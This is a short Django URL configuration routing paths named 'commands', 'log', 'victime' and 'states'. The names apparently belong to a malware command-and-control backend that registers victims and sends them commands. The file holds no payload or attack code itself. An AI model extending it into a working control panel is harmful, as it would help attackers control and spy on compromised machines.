from django.urls import path
from .views import Register,Control,LogView,VictimeView,StatesView

urlpatterns = [
    path('/', Register.as_view()),
    path('/commands', Control.as_view()),
    path('/log', LogView.as_view()),
    path('/victime',VictimeView.as_view()),
    path('/states',StatesView.as_view()),
]